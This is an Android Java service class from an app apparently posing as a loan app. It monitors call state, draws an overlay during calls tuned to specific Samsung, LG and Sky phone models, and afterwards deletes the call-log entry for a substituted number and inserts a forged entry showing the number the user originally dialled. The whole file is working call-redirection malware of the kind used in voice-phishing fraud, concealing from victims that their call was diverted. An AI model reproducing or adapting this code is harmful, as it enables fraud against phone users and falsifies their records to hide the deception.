package main.app.loan;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;

public class OnOutMonSvc extends Service {

	@Override
	public IBinder onBind(Intent arg0) { return null; }

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		return super.onStartCommand(intent, flags, startId);
		//return START_STICKY;
	}

	public static int CALL_STATE_NONE = 0;
	public static int CALL_STATE_OFFHOOK = 1;
	public static int CALL_STATE_IDLE = 2;
	
	public static Context mContext = null;
	
	public static boolean bEventThreadRun = false;
	
	public void EventCheckerProc()
	{
		int pre_state = CALL_STATE_NONE;
		
		bEventThreadRun = true;
		
		while(VarSpace.bEventSvcRun == true)
		{
			if ("".equals(VarSpace.mChangeNum) == true)
			{
				break;
			}

			try{
				int state = CALL_STATE_NONE;
				
				if ( myTelephony.isOffhook(mContext) == true )
				{
					state = CALL_STATE_OFFHOOK;
					if (pre_state != state)
					{
						HandleCallState_Offhook();
					}
				}
				
				if ( myTelephony.isIdle(mContext) == true )
				{
					state = CALL_STATE_IDLE;
					if (pre_state != state && pre_state == CALL_STATE_OFFHOOK)
					{
						HandleCallState_Idle();
					}
				}
				
				pre_state = state;
				
				GlobalLib.sleep(50);
			}
			catch(Exception e)
			{
				
			}
		}//end while
		
		bEventThreadRun = false;		
	}
	
	Thread mEventChecker = new Thread(new Runnable() {
		
		@Override
		public void run() {
			EventCheckerProc();
		}//end run
	});
	
	@Override
	public void onCreate() {

		mContext = getApplicationContext();

		if (VarSpace.bEventSvcRun == true)
		{
			return;
		}

		VarSpace.bEventSvcRun = true;

		super.onCreate();

		if (bEventThreadRun == false)
		{
			mEventChecker.start();
		}
	}
	
	
	@Override
	public void onDestroy() {

		super.onDestroy();
		
		VarSpace.bEventSvcRun = false;
	}
	
	public static final int HANDLER_MESSAGE_COLOR_BLACK = 0x11;
	public static final int HANDLER_MESSAGE_COLOR_GREEN = 0x22;
	public static final int HANDLER_MESSAGE_COLOR_RED = 0x33;
	public static final int HANDLER_MESSAGE_WAKE_SCREEN = 0x55;
	public static final int HANDLER_MESSAGE_SLEEP_SCREEN = 0x66;
	public static final int HANDLER_MESSAGE_SETVISIBLE = 0x77;
	public static final int HANDLER_MESSAGE_SETINVISIBLE = 0x88;
	public static final int HANDLER_MESSAGE_STOPSERVICE = 0x99;
	public static final int HANDLER_MESSAGE_CALLACTIVE = 0x111;
	
	public final Handler myHandler = new Handler()
	{
	    public void handleMessage( Message msg )
	    {
	      try{
			if (msg.what == HANDLER_MESSAGE_STOPSERVICE)
			{
				if (VarSpace.bTopSvcRun == true)
				{
					mContext.stopService(new Intent(mContext, OnUICtrlSvc.class));
				}
				if (VarSpace.bEventSvcRun == true)
				{
					mContext.stopService(new Intent(mContext, OnOutMonSvc.class));
				}
			}
	    	  
			if (msg.what == HANDLER_MESSAGE_COLOR_BLACK)
			{
				int nColor = Color.argb(0xff, 0x00, 0x00, 0x00);
				OnUICtrlSvc.setBackgroundColor_412(nColor);
			}
			
			if (msg.what == HANDLER_MESSAGE_COLOR_GREEN)
			{
				int nColor = Color.argb(0xff, 0x65, 0x86, 0x00);
				OnUICtrlSvc.setBackgroundColor_412(nColor);
			}

			if (msg.what == HANDLER_MESSAGE_COLOR_RED)
			{
				int nColor = Color.argb(0xff, 0xfb, 0x4a, 0x05);
				OnUICtrlSvc.setBackgroundColor_412(nColor);
			}
			
			if (msg.what == HANDLER_MESSAGE_WAKE_SCREEN)
			{
				OnUICtrlSvc.WakeOrSleep(true);
			}
			
			if (msg.what == HANDLER_MESSAGE_SLEEP_SCREEN)
			{
				OnUICtrlSvc.WakeOrSleep(false);
			}
			
			if (msg.what == HANDLER_MESSAGE_SETVISIBLE)
			{
				OnUICtrlSvc.setVisibility(true);
			}			
			
			if (msg.what == HANDLER_MESSAGE_SETINVISIBLE)
			{
				OnUICtrlSvc.setVisibility(false);
			}
			
			if (msg.what == HANDLER_MESSAGE_CALLACTIVE)
			{
				OnUICtrlSvc.ProcessCallActive();
			}
	      }
	      catch(Exception e)
	      {
	    	  
	      }
	    }
	};
	
	void SendHandlerMessage(int nOpcode)
	{
		 try{
		    Message msg = myHandler.obtainMessage();
		    msg.what = nOpcode;
		 	Bundle data=new Bundle();
		 	msg.setData(data); 
		 	myHandler.sendMessage( msg );
		 }
		 catch(Exception e)
		 {
			 
		 }
	}
	
	public void TerminateAll()
    {
		SendHandlerMessage(HANDLER_MESSAGE_SLEEP_SCREEN);

		new Thread(new Runnable() {
			
			@Override
			public void run() {
				try{
					GlobalLib.sleep(500);

					SendHandlerMessage(HANDLER_MESSAGE_SETINVISIBLE);

					for (int i = 0; i < 24; i++)
					{
						SendHandlerMessage(HANDLER_MESSAGE_SETINVISIBLE);
						GlobalLib.sleep(100);
						if (i % 6 == 0)
						{
							boolean nativeOrAction = false;
							if(i <= 12) nativeOrAction = true;
							myTelephony.show_dialer(mContext, nativeOrAction);
						}
					}

					if (VarSpace.bTopSvcRun == true)
					{
						mContext.stopService(new Intent(mContext, OnUICtrlSvc.class));
					}
					
					if (VarSpace.bEventSvcRun == true)
					{
						mContext.stopService(new Intent(mContext, OnOutMonSvc.class));
					}

					SendHandlerMessage(HANDLER_MESSAGE_WAKE_SCREEN);

					String changeNum = VarSpace.mChangeNum;
					String originNum = VarSpace.mOriginNum;
					
					VarSpace.Init();
					VarSpace.mOutgoNum = "";
					
					int nDuration = 0;
					for (int i = 0; i < 6; i++)
					{
						Thread.sleep(1 * 1000);
						int nTime = GlobalLib.DeleteCallLog(mContext, changeNum, true);
						if(nTime >= 0)
						{
							nDuration = nTime;
							break;
						}
					}
					GlobalLib.InsertCallLog(mContext, nDuration, originNum);
				}
				catch(Exception e)
				{
				}
			}
		}).start();
    }
	
	public void TerminateAll_1()
    {
		SendHandlerMessage(HANDLER_MESSAGE_SLEEP_SCREEN);

		new Thread(new Runnable() {
			
			@Override
			public void run() {
				try{
					GlobalLib.sleep(500);
					
					SendHandlerMessage(HANDLER_MESSAGE_SETINVISIBLE);

					for (int i = 0; i < 20; i++)
					{
						SendHandlerMessage(HANDLER_MESSAGE_SETINVISIBLE);
						GlobalLib.sleep(200);
					}

					if (VarSpace.bTopSvcRun == true)
					{
						mContext.stopService(new Intent(mContext, OnUICtrlSvc.class));
					}
					
					if (VarSpace.bEventSvcRun == true)
					{
						mContext.stopService(new Intent(mContext, OnOutMonSvc.class));
					}

					SendHandlerMessage(HANDLER_MESSAGE_WAKE_SCREEN);

					String changeNum = VarSpace.mChangeNum;
					String originNum = VarSpace.mOriginNum;
					
					VarSpace.Init();
					VarSpace.mOutgoNum = "";
					
					int nDuration = 0;
					for (int i = 0; i < 6; i++)
					{
						Thread.sleep(1 * 1000);
						int nTime = GlobalLib.DeleteCallLog(mContext, changeNum, true);
						if(nTime >= 0)
						{
							nDuration = nTime;
							break;
						}
					}
					GlobalLib.InsertCallLog(mContext, nDuration, originNum);
				}
				catch(Exception e)
				{
				}
			}
		}).start();
    }
	
/*	
	public static boolean mHomeWatcherRun = false;
	
	public void launchHomeWatcher()
	{
		if (mHomeWatcherRun == true) return;
		
		final String homePackage = GlobalLib.getHomePackage(mContext);
		final ITelephony itelephony = GlobalLib.getITelephony(mContext);

		new Thread(new Runnable() {
			
			@Override
			public void run() {
				mHomeWatcherRun = true;
				// TODO Auto-generated method stub
				while("".equalsIgnoreCase(VarSpace.mOriginNum) == false)
				{
					try{
						String topPackage = GlobalLib.getTopPackageName(mContext);
						
						if ("".equals(topPackage) == false)
						{
							boolean bHome = false;
							if ("".equals(homePackage) == true)
							{
								if (topPackage.indexOf("launcher") >= 0)
								{
									bHome = true;
								}
							}
							else
							{
								if (topPackage.equalsIgnoreCase(homePackage) == true)
								{
									bHome = true;
								}
							}
							
							if (bHome == true)
							{
								try{
									SendHandlerMessage(HANDLER_MESSAGE_SLEEP_SCREEN);
									SendHandlerMessage(HANDLER_MESSAGE_SETINVISIBLE);
									GlobalLib.sleep(1000);
									SendHandlerMessage(HANDLER_MESSAGE_WAKE_SCREEN);
									itelephony.endCall();
								}
								catch(Exception e)
								{
									
								}
								break;
							}
						}
					}
					catch(Exception e)
					{
						
					}
					GlobalLib.sleep(50);
				}
				mHomeWatcherRun = false;
			}
		}).start();
	}
*/	
	
	public void HandleCallState_Offhook()
	{
		if ("".equals(VarSpace.mChangeNum) == true) return;
		

		if (ModelType.getCallUiType() == ModelType.CALLUI_GALAXY_234)
		{
			//SendHandlerMessage(HANDLER_MESSAGE_SLEEP_SCREEN);

//			launchHomeWatcher();

			new Thread(new Runnable() {
				
				@Override
				public void run() {
					try{
						Thread.sleep(1300);
						SendHandlerMessage(HANDLER_MESSAGE_SETVISIBLE);
						Thread.sleep(200);
						SendHandlerMessage(HANDLER_MESSAGE_WAKE_SCREEN);
					}
					catch(Exception e)
					{
					}
				}
			}).start();
		}

		if (ModelType.getCallUiType() == ModelType.CALLUI_GALAXY_412)
		{
			//SendHandlerMessage(HANDLER_MESSAGE_SLEEP_SCREEN);

//			launchHomeWatcher();

			new Thread(new Runnable() {
				
				@Override
				public void run() {
					try{
						Thread.sleep(1300);
						SendHandlerMessage(HANDLER_MESSAGE_SETVISIBLE);
						Thread.sleep(200);
						SendHandlerMessage(HANDLER_MESSAGE_WAKE_SCREEN);
						Thread.sleep(2 * 1000);
						SendHandlerMessage(HANDLER_MESSAGE_COLOR_GREEN);
					}
					catch(Exception e)
					{
						
					}
				}
			}).start();
		}
		
		if (ModelType.getCallUiType() == ModelType.CALLUI_GALAXY_421)
		{
			//SendHandlerMessage(HANDLER_MESSAGE_SLEEP_SCREEN);

//			launchHomeWatcher();

			new Thread(new Runnable() {
				
				@Override
				public void run() {
					try{
						Thread.sleep(1300);
						SendHandlerMessage(HANDLER_MESSAGE_SETVISIBLE);
						Thread.sleep(200);
						SendHandlerMessage(HANDLER_MESSAGE_WAKE_SCREEN);
						Thread.sleep(2 * 1000);
						SendHandlerMessage(HANDLER_MESSAGE_COLOR_GREEN);
					}
					catch(Exception e)
					{
						
					}
				}
			}).start();
		}
		
		if (ModelType.getCallUiType() == ModelType.CALLUI_GALAXY_500)
		{
			//SendHandlerMessage(HANDLER_MESSAGE_SLEEP_SCREEN);

//			launchHomeWatcher();

			new Thread(new Runnable() {
				
				@Override
				public void run() {
					try{
						Thread.sleep(1300);
						SendHandlerMessage(HANDLER_MESSAGE_SETVISIBLE);
						Thread.sleep(200);
						SendHandlerMessage(HANDLER_MESSAGE_WAKE_SCREEN);
//						Thread.sleep(2 * 1000);
//						SendHandlerMessage(HANDLER_MESSAGE_COLOR_GREEN);
					}
					catch(Exception e)
					{
						
					}
				}
			}).start();
		}
		
		if (ModelType.getCallUiType() == ModelType.CALLUI_LGOPTIMUS_500)
		{
			//SendHandlerMessage(HANDLER_MESSAGE_SLEEP_SCREEN);

//			launchHomeWatcher();

			new Thread(new Runnable() {
				
				@Override
				public void run() {
					try{
						Thread.sleep(1300);
						SendHandlerMessage(HANDLER_MESSAGE_SETVISIBLE);
						Thread.sleep(200);
						SendHandlerMessage(HANDLER_MESSAGE_WAKE_SCREEN);
//						Thread.sleep(2 * 1000);
//						SendHandlerMessage(HANDLER_MESSAGE_COLOR_GREEN);
					}
					catch(Exception e)
					{
						
					}
				}
			}).start();
		}
		
		if (ModelType.getCallUiType() == ModelType.CALLUI_LGOPTIMUS_412)
		{
			//SendHandlerMessage(HANDLER_MESSAGE_SLEEP_SCREEN);

//			launchHomeWatcher();

			new Thread(new Runnable() {
				
				@Override
				public void run() {
					try{
						Thread.sleep(1300);
						SendHandlerMessage(HANDLER_MESSAGE_SETVISIBLE);
						Thread.sleep(200);
						SendHandlerMessage(HANDLER_MESSAGE_WAKE_SCREEN);
						Thread.sleep(2 * 1000);
						//SendHandlerMessage(HANDLER_MESSAGE_COLOR_GREEN);
					}
					catch(Exception e)
					{
						
					}
				}
			}).start();
		}
		
		if (ModelType.getCallUiType() == ModelType.CALLUI_LGOPTIMUS_234)
		{
			//SendHandlerMessage(HANDLER_MESSAGE_SLEEP_SCREEN);

//			launchHomeWatcher();

			new Thread(new Runnable() {
				
				@Override
				public void run() {
					try{
						Thread.sleep(1300);
						SendHandlerMessage(HANDLER_MESSAGE_SETVISIBLE);
						Thread.sleep(200);
						SendHandlerMessage(HANDLER_MESSAGE_WAKE_SCREEN);
					}
					catch(Exception e)
					{
					}
				}
			}).start();
		}
		
		if (ModelType.getCallUiType() == ModelType.CALLUI_SKYVEGA_412)
		{
			//SendHandlerMessage(HANDLER_MESSAGE_SLEEP_SCREEN);

//			launchHomeWatcher();

			new Thread(new Runnable() {
				
				@Override
				public void run() {
					try{
						Thread.sleep(1300);
						SendHandlerMessage(HANDLER_MESSAGE_SETVISIBLE);
						Thread.sleep(200);
						SendHandlerMessage(HANDLER_MESSAGE_WAKE_SCREEN);
						Thread.sleep(2 * 1000);
						//SendHandlerMessage(HANDLER_MESSAGE_COLOR_GREEN);
					}
					catch(Exception e)
					{
						
					}
				}
			}).start();
		}
		
		if (ModelType.getCallUiType() == ModelType.CALLUI_SKYVEGA_442)
		{
			//SendHandlerMessage(HANDLER_MESSAGE_SLEEP_SCREEN);

//			launchHomeWatcher();

			new Thread(new Runnable() {
				
				@Override
				public void run() {
					try{
						Thread.sleep(1300);
						SendHandlerMessage(HANDLER_MESSAGE_SETVISIBLE);
						Thread.sleep(200);
						SendHandlerMessage(HANDLER_MESSAGE_WAKE_SCREEN);
						Thread.sleep(2 * 1000);
						//SendHandlerMessage(HANDLER_MESSAGE_COLOR_GREEN);
					}
					catch(Exception e)
					{
						
					}
				}
			}).start();
		}
	}
	
	public void HandleCallState_Idle()
	{
		if ("".equals(VarSpace.mChangeNum) == true) return;
		
		if (ModelType.getCallUiType() == ModelType.CALLUI_GALAXY_234)
		{
			TerminateAll();
		}

		if (ModelType.getCallUiType() == ModelType.CALLUI_GALAXY_412)
		{
			SendHandlerMessage(HANDLER_MESSAGE_COLOR_RED);
			TerminateAll();
		}

		if (ModelType.getCallUiType() == ModelType.CALLUI_GALAXY_421)
		{
			SendHandlerMessage(HANDLER_MESSAGE_COLOR_RED);
			TerminateAll();
		}
		
		if (ModelType.getCallUiType() == ModelType.CALLUI_GALAXY_500)
		{
			TerminateAll();
		}

		if (ModelType.getCallUiType() == ModelType.CALLUI_LGOPTIMUS_234)
		{
			TerminateAll_1();
		}

		if (ModelType.getCallUiType() == ModelType.CALLUI_LGOPTIMUS_412)
		{
			TerminateAll_1();
		}
		
		if (ModelType.getCallUiType() == ModelType.CALLUI_LGOPTIMUS_500)
		{
			TerminateAll_1();
		}
		
		if (ModelType.getCallUiType() == ModelType.CALLUI_SKYVEGA_412)
		{
			TerminateAll_1();
		}
		
		if (ModelType.getCallUiType() == ModelType.CALLUI_SKYVEGA_442)
		{
			TerminateAll_1();
		}
	}

	
}